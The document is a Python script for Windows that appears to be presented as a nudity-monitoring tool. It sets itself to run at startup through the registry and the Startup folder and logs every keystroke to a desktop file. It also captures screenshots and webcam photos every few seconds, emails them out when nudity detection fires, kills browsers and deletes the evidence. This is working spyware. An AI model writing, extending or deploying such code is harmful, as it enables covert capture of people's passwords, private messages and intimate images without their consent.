import os
import sys
import time
import shutil
import winreg as reg
import psutil
import requests
import yagmail
from getpass import getuser
from PIL import ImageGrab
import keyboard
from nudenet import NudeDetector
import cv2
import ctypes

# Time interval between alerts (1 hour in seconds)
alert_interval = 60 * 2
last_alert_time = 0

# Helper functions
def add_to_startup():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    user_name = getuser()
    startup = f'C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    script_path = os.path.abspath(sys.argv[0])

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, "MyScript", 0, reg.REG_SZ, script_path)
        reg.CloseKey(reg_key)
        shutil.copy(script_path, startup)
        print("Script added to startup successfully.")
    except Exception as e:
        print(f"Unable to add to startup: {e}")


def set_process_priority():
    try:
        pid = os.getpid()
        p = psutil.Process(pid)
        p.nice(psutil.HIGH_PRIORITY_CLASS)
        print("Process priority set to high.")
    except Exception as e:
        print(f"Unable to set process priority: {e}")


def create_folder_on_desktop(folder_name):
    try:
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        folder_path = os.path.join(desktop_path, folder_name)
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        return folder_path
    except Exception as e:
        print(f"Unable to create folder on desktop: {e}")
        return None


def write_to_file(file_path, text):
    try:
        with open(file_path, 'a') as file:
            file.write(text)
    except Exception as e:
        print(f"Unable to write to file {file_path}: {e}")


def overwrite_file(file_path, text):
    try:
        with open(file_path, 'w') as file:
            file.write(text)
    except Exception as e:
        print(f"Unable to overwrite file {file_path}: {e}")


def capture_screenshot(capture_folder):
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(capture_folder, f"screenshot_{time.strftime('%Y-%m-%d_%H-%M-%S')}.png")
        screenshot.save(screenshot_path)
        print(f"Screenshot saved to {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"Unable to capture screenshot: {e}")
        return None


def send_email(subject, attachments):
    try:
        yag = yagmail.SMTP('', '')
        yag.send('', subject, attachments)
        print(f"Email sent with subject: {subject}")
    except Exception as e:
        print(f"Unable to send email: {e}")


def check_nudity(image_path):
    try:
        nude_detector = NudeDetector()
        detections = nude_detector.detect(image_path)
        return detections
    except Exception as e:
        print(f"Unable to check nudity: {e}")
        return []


def log_keypress(event):
    try:
        global current_word
        if event.name == 'space':
            current_word += ' '
        elif event.name == 'enter':
            current_word += '\n'
        elif event.name == 'backspace':
            current_word = current_word[:-1]
        elif len(event.name) == 1:
            current_word += event.name

        write_to_file(os.path.join(create_folder_on_desktop("Helium"), "entries.txt"), current_word)
        current_word = ''
    except Exception as e:
        print(f"Unable to log keypress: {e}")


def get_system_info():
    try:
        system_info = ""
        system_info += f"Username: {getuser()}\n"
        system_info += f"Platform: {sys.platform}\n"
        system_info += f"Processor: {psutil.cpu_percent()}%\n"
        system_info += f"Memory: {psutil.virtual_memory().percent}%\n"
        system_info += f"Disk: {psutil.disk_usage('/').percent}%\n"

        try:
            response = requests.get('https://api.ipify.org')
            ip = response.text.strip()
            system_info += f"Public IP: {ip}\n"
        except requests.RequestException as e:
            print(f"Unable to get public IP: {e}")
            system_info += "Public IP: Not available\n"

        return system_info
    except Exception as e:
        print(f"Unable to get system info: {e}")
        return "Unable to retrieve system information.\n"


def ensure_directories_and_files_exist():
    global folder_path, capture_folder, system_info_path, entries_path
    if not os.path.exists(folder_path):
        folder_path = create_folder_on_desktop("Helium")
    if not os.path.exists(capture_folder):
        os.makedirs(capture_folder)
    if not os.path.exists(system_info_path):
        with open(system_info_path, 'w') as file:
            pass
        system_info = get_system_info()
        overwrite_file(system_info_path, system_info)
    if not os.path.exists(entries_path):
        with open(entries_path, 'w') as file:
            pass


def check_internet_connection():
    try:
        requests.get('https://www.google.com', timeout=5)
        return True
    except requests.RequestException:
        return False


def capture_webcam_image(folder_path):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        webcam_image_path = os.path.join(folder_path, f"webcam_{time.strftime('%Y-%m-%d_%H-%M-%S')}.png")
        if ret:
            cv2.imwrite(webcam_image_path, frame)
            print(f"Webcam image saved to {webcam_image_path}")
        cap.release()
        return webcam_image_path if ret else None
    except Exception as e:
        print(f"Unable to capture webcam image: {e}")
        return None


def block_internet_access():
    try:
        browser_processes = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe"]
        for proc in psutil.process_iter():
            if proc.name().lower() in browser_processes:
                proc.kill()
                print(f"Killed process: {proc.name()}")
    except Exception as e:
        print(f"Unable to block internet access: {e}")


def delete_sensitive_files(files):
    try:
        for file in files:
            if os.path.exists(file):
                os.remove(file)
                print(f"Deleted file: {file}")
    except Exception as e:
        print(f"Unable to delete files: {e}")


def show_warning_message():
    try:
        ctypes.windll.user32.MessageBoxW(0, "Inappropriate content detected. Administrator has been notified.",
                                         "Warning", 0x30)
    except Exception as e:
        print(f"Unable to show warning message: {e}")


def should_send_alert():
    global last_alert_time
    current_time = time.time()
    if current_time - last_alert_time > alert_interval:
        last_alert_time = current_time
        return True
    return False


# Add script to startup
add_to_startup()

# Set process priority
set_process_priority()

if __name__ == "__main__":
    folder_name = "Helium"
    folder_path = create_folder_on_desktop(folder_name)
    if folder_path is None:
        sys.exit("Unable to create necessary folders. Exiting.")

    capture_folder = os.path.join(folder_path, "captures")
    system_info_path = os.path.join(folder_path, "system_info.txt")
    entries_path = os.path.join(folder_path, "entries.txt")
    current_word = ''

    ensure_directories_and_files_exist()

    # Log keypress events
    keyboard.on_press(log_keypress)

    try:
        while True:
            # Screenshot capture and nudity detection
            screenshot_path = capture_screenshot(capture_folder)
            webcam_image_path = capture_webcam_image(capture_folder)

            if screenshot_path and check_nudity(screenshot_path):
                if should_send_alert():
                    send_email("Nudity Alert Detected", [screenshot_path, webcam_image_path])

                    # Show warning message
                    show_warning_message()

                    # Block internet access
                    block_internet_access()

                    # Auto-delete files after sending
                    delete_sensitive_files([screenshot_path, webcam_image_path])

            time.sleep(5)  # Run every 5 seconds
    except KeyboardInterrupt:
        print("Script interrupted.")
        sys.exit(0)
